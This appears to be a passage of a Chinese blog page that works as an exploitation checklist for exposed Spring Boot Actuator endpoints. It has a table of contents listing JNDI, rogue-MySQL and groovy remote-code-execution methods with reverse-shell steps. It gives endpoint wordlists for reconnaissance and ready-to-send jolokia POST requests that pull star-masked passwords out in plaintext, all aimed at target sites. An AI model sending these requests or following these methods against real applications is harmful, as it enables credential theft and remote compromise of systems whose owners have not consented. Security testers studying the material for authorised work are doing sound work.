<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81">步骤三：准备要执行的 Java 代码</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1">步骤四：架设恶意 ldap 服务</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3">步骤五：监听反弹 shell 的端口</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E4%BB%8E%E5%A4%96%E9%83%A8-url-%E5%9C%B0%E5%9D%80%E5%8A%A0%E8%BD%BD%E6%97%A5%E5%BF%97%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">步骤六：从外部 URL 地址加载日志配置文件</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3">漏洞原理：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3">漏洞分析：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-3">漏洞环境：</a></li>
</ul>
</li>
<li><a href="#0x05jolokia-realm-jndi-rce">0x05：jolokia Realm JNDI RCE</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-8">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-8">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84-mbeans-1">步骤一：查看已存在的 MBeans</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81">步骤二：准备要执行的 Java 代码</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E6%89%98%E7%AE%A1-class-%E6%96%87%E4%BB%B6">步骤三：托管 class 文件</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-rmi-%E6%9C%8D%E5%8A%A1">步骤四：架设恶意 rmi 服务</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3-1">步骤五：监听反弹 shell 的端口</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E5%8F%91%E9%80%81%E6%81%B6%E6%84%8F-payload">步骤六：发送恶意 payload</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4">漏洞原理：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4">漏洞分析：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-4">漏洞环境：</a></li>
</ul>
</li>
<li><a href="#0x06restart-h2-database-query-rce">0x06：restart h2 database query RCE</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-9">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-9">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E8%AE%BE%E7%BD%AE-springdatasourcehikariconnection-test-query-%E5%B1%9E%E6%80%A7">步骤一：设置 spring.datasource.hikari.connection-test-query 属性</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8">步骤二：重启应用</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-5">漏洞原理：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5">漏洞分析：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-5">漏洞环境：</a></li>
</ul>
</li>
<li><a href="#0x07h2-database-console-jndi-rce">0x07：h2 database console JNDI RCE</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-10">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-10">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E8%AE%BF%E9%97%AE%E8%B7%AF%E7%94%B1%E8%8E%B7%E5%BE%97-jsessionid">步骤一：访问路由获得 jsessionid</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81-1">步骤二：准备要执行的 Java 代码</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E6%89%98%E7%AE%A1-class-%E6%96%87%E4%BB%B6-1">步骤三：托管 class 文件</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1-1">步骤四：架设恶意 ldap 服务</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3-2">步骤五：监听反弹 shell 的端口</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E5%8F%91%E5%8C%85%E8%A7%A6%E5%8F%91-jndi-%E6%B3%A8%E5%85%A5">步骤六：发包触发 JNDI 注入</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6">漏洞分析：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-6">漏洞环境：</a></li>
</ul>
</li>
<li><a href="#0x08mysql-jdbc-deserialization-rce">0x08：mysql jdbc deserialization RCE</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-11">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-11">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E7%8E%AF%E5%A2%83%E4%BE%9D%E8%B5%96">步骤一：查看环境依赖</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-rogue-mysql-server">步骤二：架设恶意 rogue mysql server</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-springdatasourceurl-%E5%B1%9E%E6%80%A7">步骤三：设置 spring.datasource.url 属性</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-1">步骤四：刷新配置</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E8%A7%A6%E5%8F%91%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2">步骤五：触发数据库查询</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E6%81%A2%E5%A4%8D%E6%AD%A3%E5%B8%B8-jdbc-url">步骤六：恢复正常 jdbc url</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-6">漏洞原理：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-7">漏洞分析：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-7">漏洞环境：</a></li>
</ul>
</li>
<li><a href="#0x09restart-loggingconfig-logback-jndi-rce">0x09：restart logging.config logback JNDI RCE</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-12">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-12">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%98%E7%AE%A1-xml-%E6%96%87%E4%BB%B6">步骤一：托管 xml 文件</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%98%E7%AE%A1%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1%E5%8F%8A%E4%BB%A3%E7%A0%81">步骤二：托管恶意 ldap 服务及代码</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-loggingconfig-%E5%B1%9E%E6%80%A7">步骤三：设置 logging.config 属性</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8">步骤四：重启应用</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-7">漏洞原理：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-8">漏洞分析：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-8">漏洞环境：</a></li>
</ul>
</li>
<li><a href="#0x0arestart-loggingconfig-groovy-rce">0x0A：restart logging.config groovy RCE</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-13">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-13">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%98%E7%AE%A1-groovy-%E6%96%87%E4%BB%B6">步骤一：托管 groovy 文件</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E8%AE%BE%E7%BD%AE-loggingconfig-%E5%B1%9E%E6%80%A7">步骤二：设置 logging.config 属性</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8">步骤三：重启应用</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-8">漏洞原理：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-9">漏洞环境：</a></li>
</ul>
</li>
<li><a href="#0x0brestart-springmainsources-groovy-rce">0x0B：restart spring.main.sources groovy RCE</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-14">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-14">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%98%E7%AE%A1-groovy-%E6%96%87%E4%BB%B6-1">步骤一：托管 groovy 文件</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E8%AE%BE%E7%BD%AE-springmainsources-%E5%B1%9E%E6%80%A7">步骤二：设置 spring.main.sources 属性</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8-1">步骤三：重启应用</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-9">漏洞原理：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-10">漏洞环境：</a></li>
</ul>
</li>
<li><a href="#0x0crestart-springdatasourcedata-h2-database-rce">0x0C：restart spring.datasource.data h2 database RCE</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-15">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-15">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%98%E7%AE%A1-sql-%E6%96%87%E4%BB%B6">步骤一：托管 sql 文件</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E8%AE%BE%E7%BD%AE-springdatasourcedata-%E5%B1%9E%E6%80%A7">步骤二：设置 spring.datasource.data 属性</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8-2">步骤三：重启应用</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-10">漏洞原理：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-11">漏洞环境：</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="零：路由和版本"><a href="#零：路由和版本" class="headerlink" title="零：路由和版本"></a>零：路由和版本</h2><h3 id="0x01：路由知识"><a href="#0x01：路由知识" class="headerlink" title="0x01：路由知识"></a>0x01：路由知识</h3><ul>
<li>有些程序员会自定义 <code>/manage</code>、<code>/management</code> 、<strong>项目 App 相关名称</strong>为 spring 根路径</li>
<li>Spring Boot Actuator 1.x 版本默认内置路由的起始路径为  <code>/</code> ，2.x 版本则统一以 <code>/actuator</code> 为起始路径</li>
<li>Spring Boot Actuator 默认的内置路由名字，如 <code>/env</code> 有时候也会被程序员修改，比如修改成 <code>/appenv</code></li>
</ul>
<h3 id="0x02：版本知识"><a href="#0x02：版本知识" class="headerlink" title="0x02：版本知识"></a>0x02：版本知识</h3><blockquote>
<p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。</p>
</blockquote>
<h4 id="组件版本的相互依赖关系："><a href="#组件版本的相互依赖关系：" class="headerlink" title="组件版本的相互依赖关系："></a>组件版本的相互依赖关系：</h4><table>
<thead>
<tr>
<th>依赖项</th>
<th>版本列表及依赖组件版本</th>
</tr>
</thead>
<tbody><tr>
<td>spring-boot-starter-parent</td>
<td><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent">spring-boot-starter-parent</a></td>
</tr>
<tr>
<td>spring-boot-dependencies</td>
<td><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies">spring-boot-dependencies</a></td>
</tr>
<tr>
<td>spring-cloud-dependencies</td>
<td><a href="https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies">spring-cloud-dependencies</a></td>
</tr>
</tbody></table>
<h4 id="Spring-Cloud-与-Spring-Boot-版本之间的依赖关系："><a href="#Spring-Cloud-与-Spring-Boot-版本之间的依赖关系：" class="headerlink" title="Spring Cloud 与 Spring Boot 版本之间的依赖关系："></a>Spring Cloud 与 Spring Boot 版本之间的依赖关系：</h4><table>
<thead>
<tr>
<th>Spring Cloud 大版本</th>
<th>Spring Boot 版本</th>
</tr>
</thead>
<tbody><tr>
<td>Angel</td>
<td>兼容 Spring Boot 1.2.x</td>
</tr>
<tr>
<td>Brixton</td>
<td>兼容 Spring Boot 1.3.x、1.4.x</td>
</tr>
<tr>
<td>Camden</td>
<td>兼容 Spring Boot 1.4.x、1.5.x</td>
</tr>
<tr>
<td>Dalston</td>
<td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
</tr>
<tr>
<td>Edgware</td>
<td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
</tr>
<tr>
<td>Finchley</td>
<td>兼容 Spring Boot 2.0.x，不兼容 1.5.x</td>
</tr>
<tr>
<td>Greenwich</td>
<td>兼容 Spring Boot 2.1.x</td>
</tr>
<tr>
<td>Hoxton</td>
<td>兼容 Spring Boot 2.2.x</td>
</tr>
</tbody></table>
<h4 id="Spring-Cloud-小版本号的后缀及含义"><a href="#Spring-Cloud-小版本号的后缀及含义" class="headerlink" title="Spring Cloud 小版本号的后缀及含义:"></a>Spring Cloud 小版本号的后缀及含义:</h4><table>
<thead>
<tr>
<th>小版本号后缀</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>BUILD-SNAPSHOT</td>
<td>快照版，代码不是固定，处于变化之中</td>
</tr>
<tr>
<td>MX</td>
<td>里程碑版</td>
</tr>
<tr>
<td>RCX</td>
<td>候选发布版</td>
</tr>
<tr>
<td>RELEASE</td>
<td>正式发布版</td>
</tr>
<tr>
<td>SRX</td>
<td>(修复错误和 bug 并再次发布的)正式发布版</td>
</tr>
</tbody></table>
<h2 id="一：信息泄露"><a href="#一：信息泄露" class="headerlink" title="一：信息泄露"></a>一：信息泄露</h2><h3 id="0x01：路由地址及接口调用详情泄漏"><a href="#0x01：路由地址及接口调用详情泄漏" class="headerlink" title="0x01：路由地址及接口调用详情泄漏"></a>0x01：路由地址及接口调用详情泄漏</h3><blockquote>
<p>开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等</p>
</blockquote>
<p>直接访问以下两个 swagger 相关路由，验证漏洞是否存在：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;v2&#x2F;api-docs</span><br><span class="line">&#x2F;swagger-ui.html</span><br></pre></td></tr></table></figure>



<p>其他一些可能会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口路由：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;swagger</span><br><span class="line">&#x2F;api-docs</span><br><span class="line">&#x2F;api.html</span><br><span class="line">&#x2F;swagger-ui</span><br><span class="line">&#x2F;swagger&#x2F;codes</span><br><span class="line">&#x2F;api&#x2F;index.html</span><br><span class="line">&#x2F;api&#x2F;v2&#x2F;api-docs</span><br><span class="line">&#x2F;v2&#x2F;swagger.json</span><br><span class="line">&#x2F;swagger-ui&#x2F;html</span><br><span class="line">&#x2F;distv2&#x2F;index.html</span><br><span class="line">&#x2F;swagger&#x2F;index.html</span><br><span class="line">&#x2F;sw&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;api&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;static&#x2F;swagger.json</span><br><span class="line">&#x2F;user&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;swagger-ui&#x2F;index.html</span><br><span class="line">&#x2F;swagger-dubbo&#x2F;api-docs</span><br><span class="line">&#x2F;template&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;swagger&#x2F;static&#x2F;index.html</span><br><span class="line">&#x2F;dubbo-provider&#x2F;distv2&#x2F;index.html</span><br><span class="line">&#x2F;spring-security-rest&#x2F;api&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;spring-security-oauth-resource&#x2F;swagger-ui.html</span><br></pre></td></tr></table></figure>



<p>除此之外，下面的 spring boot actuator 相关路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;mappings</span><br><span class="line">&#x2F;metrics</span><br><span class="line">&#x2F;beans</span><br><span class="line">&#x2F;configprops</span><br><span class="line">&#x2F;actuator&#x2F;metrics</span><br><span class="line">&#x2F;actuator&#x2F;mappings</span><br><span class="line">&#x2F;actuator&#x2F;beans</span><br><span class="line">&#x2F;actuator&#x2F;configprops</span><br></pre></td></tr></table></figure>



<p><strong>一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞</strong>，但是以 “<strong>默认安全</strong>“ 来讲，不暴露出这些信息更加安全。</p>
<p>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。</p>
<h3 id="0x02：配置不当而暴露的路由"><a href="#0x02：配置不当而暴露的路由" class="headerlink" title="0x02：配置不当而暴露的路由"></a>0x02：配置不当而暴露的路由</h3><blockquote>
<p>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置</p>
</blockquote>
<p>参考 <a href="https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints">production-ready-endpoints</a> 和 <a href="https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt">spring-boot.txt</a>，可能因为配置不当而暴露的默认内置路由可能会有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;actuator</span><br><span class="line">&#x2F;auditevents</span><br><span class="line">&#x2F;autoconfig</span><br><span class="line">&#x2F;beans</span><br><span class="line">&#x2F;caches</span><br><span class="line">&#x2F;conditions</span><br><span class="line">&#x2F;configprops</span><br><span class="line">&#x2F;docs</span><br><span class="line">&#x2F;dump</span><br><span class="line">&#x2F;env</span><br><span class="line">&#x2F;flyway</span><br><span class="line">&#x2F;health</span><br><span class="line">&#x2F;heapdump</span><br><span class="line">&#x2F;httptrace</span><br><span class="line">&#x2F;info</span><br><span class="line">&#x2F;intergrationgraph</span><br><span class="line">&#x2F;jolokia</span><br><span class="line">&#x2F;logfile</span><br><span class="line">&#x2F;loggers</span><br><span class="line">&#x2F;liquibase</span><br><span class="line">&#x2F;metrics</span><br><span class="line">&#x2F;mappings</span><br><span class="line">&#x2F;prometheus</span><br><span class="line">&#x2F;refresh</span><br><span class="line">&#x2F;scheduledtasks</span><br><span class="line">&#x2F;sessions</span><br><span class="line">&#x2F;shutdown</span><br><span class="line">&#x2F;trace</span><br><span class="line">&#x2F;threaddump</span><br><span class="line">&#x2F;actuator&#x2F;auditevents</span><br><span class="line">&#x2F;actuator&#x2F;beans</span><br><span class="line">&#x2F;actuator&#x2F;health</span><br><span class="line">&#x2F;actuator&#x2F;conditions</span><br><span class="line">&#x2F;actuator&#x2F;configprops</span><br><span class="line">&#x2F;actuator&#x2F;env</span><br><span class="line">&#x2F;actuator&#x2F;info</span><br><span class="line">&#x2F;actuator&#x2F;loggers</span><br><span class="line">&#x2F;actuator&#x2F;heapdump</span><br><span class="line">&#x2F;actuator&#x2F;threaddump</span><br><span class="line">&#x2F;actuator&#x2F;metrics</span><br><span class="line">&#x2F;actuator&#x2F;scheduledtasks</span><br><span class="line">&#x2F;actuator&#x2F;httptrace</span><br><span class="line">&#x2F;actuator&#x2F;mappings</span><br><span class="line">&#x2F;actuator&#x2F;jolokia</span><br><span class="line">&#x2F;actuator&#x2F;hystrix.stream</span><br></pre></td></tr></table></figure>



<p>其中对寻找漏洞比较重要接口的有：</p>
<ul>
<li><p><code>/env</code>、<code>/actuator/env</code></p>
<p>GET 请求 <code>/env</code> 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；</p>
<p>同时有一定概率可以通过 POST 请求 <code>/env</code> 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p>
</li>
<li><p><code>/refresh</code>、<code>/actuator/refresh</code></p>
<p>POST 请求 <code>/env</code> 接口设置属性后，可同时配合 POST 请求 <code>/refresh</code> 接口刷新属性变量来触发相关 RCE 漏洞。</p>
</li>
<li><p><code>/restart</code>、<code>/actuator/restart</code></p>
<p>暴露出此接口的情况较少；可以配合 POST请求 <code>/env</code> 接口设置属性后，再 POST 请求 <code>/restart</code> 接口重启应用来触发相关 RCE 漏洞。</p>
</li>
<li><p><code>/jolokia</code>、<code>/actuator/jolokia</code></p>
<p>可以通过 <code>/jolokia/list</code> 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p>
</li>
<li><p><code>/trace</code>、<code>/actuator/httptrace</code></p>
<p>一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>
</li>
</ul>
<h3 id="0x03：获取被星号脱敏的密码的明文-方法一"><a href="#0x03：获取被星号脱敏的密码的明文-方法一" class="headerlink" title="0x03：获取被星号脱敏的密码的明文 (方法一)"></a>0x03：获取被星号脱敏的密码的明文 (方法一)</h3><blockquote>
<p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
</blockquote>
<h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
<li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）</li>
</ul>
<h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名"><a href="#步骤一：-找到想要获取的属性名" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
<h5 id="步骤二：-jolokia-调用相关-Mbean-获取明文"><a href="#步骤二：-jolokia-调用相关-Mbean-获取明文" class="headerlink" title="步骤二： jolokia 调用相关 Mbean 获取明文"></a>步骤二： jolokia 调用相关 Mbean 获取明文</h5><p>将下面示例中的 <code>security.user.password</code> 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 <code>value</code> 键中。</p>
<ul>
<li>调用 <code>org.springframework.boot</code> Mbean</li>
</ul>
<blockquote>
<p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p>
</blockquote>
<p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;jolokia</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name&#x3D;SpringApplication,type&#x3D;Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;jolokia</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name&#x3D;SpringApplication,type&#x3D;Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>调用 <code>org.springframework.cloud.context.environment</code> Mbean</li>
</ul>
<blockquote>
<p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p>
</blockquote>
<p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;jolokia</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name&#x3D;environmentManager,type&#x3D;EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;jolokia</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name&#x3D;environmentManager,type&#x3D;EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>调用其他 Mbean</li>
</ul>
<blockquote>
<p>目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。</p>
</blockquote>
<h3 id="0x04：获取被星号脱敏的密码的明文-方法二"><a href="#0x04：获取被星号脱敏的密码的明文-方法二" class="headerlink" title="0x04：获取被星号脱敏的密码的明文 (方法二)"></a>0x04：获取被星号脱敏的密码的明文 (方法二)</h3><h4 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>可以 GET 请求目标网站的 <code>/env</code> </li>
<li>可以 POST 请求目标网站的 <code>/env</code> </li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>
